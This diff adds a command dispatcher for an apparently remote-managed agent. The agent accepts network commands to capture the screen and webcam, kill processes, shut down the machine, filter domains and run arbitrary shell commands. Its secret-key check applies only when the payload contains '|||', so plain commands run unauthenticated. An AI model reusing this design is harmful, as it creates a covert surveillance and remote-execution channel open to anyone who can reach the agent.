@@ -1,0 +1,95 @@
+import "identity.dz" as idModule
+import "../services/processes.dz" as procModule
+import "../services/screen.dz" as screenModule
+import "../services/system.dz" as sysModule
+import "../services/webfilter.dz" as webModule
+import "constants.dz" as constants
+
+# =============================================================================
+# CommandRouter — Central dispatcher routing network commands to services.
+# =============================================================================
+class CommandRouter
+    init(identity)
+        self.identity = identity
+        self.processes = new procModule.ProcessService()
+        self.screen = new screenModule.ScreenService()
+        self.system = new sysModule.SystemService()
+        self.webfilter = new webModule.WebFilterService()
+    end
+
+    # Routes a raw network command payload to the corresponding service method.
+    # @param {string} raw - Raw payload string.
+    # @return {string} Command execution response.
+    dispatch(raw)
+        let cmd = raw.strip()
+        if raw.contains("|||")
+            let parts = raw.split("|||")
+            if parts.length() >= 2
+                if parts[0] != constants.SECRET_KEY
+                    return "ERR:UNAUTHORIZED"
+                end
+                cmd = parts[1].strip()
+            end
+        end
+
+        print("[Agent] Received command: " + cmd.slice(0, 80))
+
+        # PING includes permanent DeviceId + Hostname
+        if cmd == "PING"
+            return "PONG:" + self.identity.getDeviceId() + ":" + self.identity.getHostname()
+
+        elif cmd == "EXIT"
+            thread.spawnCode(`
+use process
+process.sleep(1.0)
+process.exit(0)
+`)
+            return "OK:EXIT"
+
+        elif cmd == "SYSINFO"
+            return self.system.getSysInfo()
+
+        elif cmd == "LOCK"
+            return self.system.lockWorkstation()
+
+        elif cmd == "SHUTDOWN"
+            return self.system.shutdown()
+
+        elif cmd == "RESTART"
+            return self.system.restart()
+
+        elif cmd == "SCREENSHOT"
+            return self.screen.captureScreen()
+
+        elif cmd == "WEBCAM"
+            return self.screen.captureWebcam()
+
+        elif cmd == "ACTIVE_WINDOW"
+            return self.system.getActiveWindow()
+
+        elif cmd == "TASKS"
+            return self.processes.getTasks()
+
+        elif cmd.startsWith("KILL:")
+            return self.processes.killTask(cmd.slice(5, cmd.length()).strip())
+
+        elif cmd.startsWith("MSG:")
+            return self.system.showMessage(cmd.slice(4, cmd.length()))
+
+        elif cmd.startsWith("BLOCK:")
+            return self.webfilter.blockDomain(cmd.slice(6, cmd.length()).strip())
+
+        elif cmd.startsWith("UNBLOCK:")
+            return self.webfilter.unblockDomain(cmd.slice(8, cmd.length()).strip())
+
+        elif cmd.startsWith("SCHEDULE:")
+            return self.system.setSchedule(cmd.slice(9, cmd.length()).strip())
+
+        elif cmd.startsWith("EXEC:")
+            return self.system.execCommand(cmd.slice(5, cmd.length()))
+
+        else
+            return "ERR:UNKNOWN_COMMAND:" + cmd
+        end
+    end
+end
